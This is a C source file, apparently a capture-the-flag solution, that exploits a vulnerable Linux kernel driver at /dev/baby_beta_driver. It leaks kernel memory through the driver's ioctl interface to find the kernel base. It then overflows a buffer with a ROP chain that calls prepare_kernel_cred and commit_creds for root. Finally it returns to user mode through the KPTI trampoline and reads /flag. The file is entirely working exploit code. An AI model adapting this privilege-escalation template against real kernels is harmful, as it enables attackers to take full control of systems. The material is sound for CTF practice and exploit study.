#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <poll.h>
#include <assert.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include<sys/xattr.h>


#define ADD 0x1337C0DE
#define COPY 0xC0DE1337
#define INVALID -1
#define ulong unsigned long

ulong user_cs,user_ss,user_sp,user_rflags;
int fd=-1;

typedef struct req {
    unsigned int size;
    char* transfer_data;
} req;

void add(unsigned int size, char* transfer_data){
    req r;
    r.size = size;
    r.transfer_data = transfer_data;
    int ret = ioctl(fd,ADD,(unsigned long )&r);
    puts("[+] Add ok!");

}

void flag(){
    system("/bin/cat /flag");
    return;
}
void copy(unsigned int size,char* transfer_data){
    req r;
    r.size = size;
    r.transfer_data = transfer_data;
    int ret = ioctl(fd,COPY,(unsigned long)&r);
    puts("[+] Copy ok!");
    return;
}

static void save_state(void) {
  asm (
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}


void Open(){
    fd = open("/dev/baby_beta_driver",O_RDWR);
    if(fd<0){
        perror("[-] Error in hackme");
        exit(INVALID);
    }
    puts("[+] Opened blazeme");
}
int main(){
    save_state();
    Open();
    int ptmx = open("/dev/ptmx",O_RDWR | O_NOCTTY);
    close(ptmx);
    unsigned long leak_buf[0x30/8] = {0};
    add(0x2e0,(char *)0);
    copy(0x30,(char *)leak_buf);
    for(int i=0;i<sizeof(leak_buf)/8;i++){
        printf("[*] leak_buf[%d] = 0x%lx\n",i,leak_buf[i]);
    }
    ulong kbase = leak_buf[3] - 0x623cc0L;
    printf("[+] Kbase -> 0x%lx\n",kbase);
    ulong commit_creds = kbase + 0x53d00L;
    ulong prepare_kernel_cred = kbase + 0x53bb0L;
    ulong pop_rdi = kbase + 0x11a54dL;
    ulong pop_rcx = kbase + 0x18b1f3L;
    ulong mov_rdi_rax = kbase + 0x1af61aL;
    ulong kpti_trampoline = kbase + 0x200cb0L;

    ulong rop[0x200] = {0};
    char buf[200]={0};
    int i = 8;
    for(int j=0;j<8;j++)
        rop[j] = 0x6161616161616161;

    rop[i++] = pop_rdi;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = pop_rcx;
    rop[i++] = 0;
    rop[i++] = mov_rdi_rax;
    rop[i++] = commit_creds;
    rop[i++] = kpti_trampoline + 22;
    rop[i++] = 0; //rax
    rop[i++] = 0; //rdi
    rop[i++] = (unsigned long)&flag;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    add(0x400,(char *)rop);
    copy(300,(char *)buf);
}
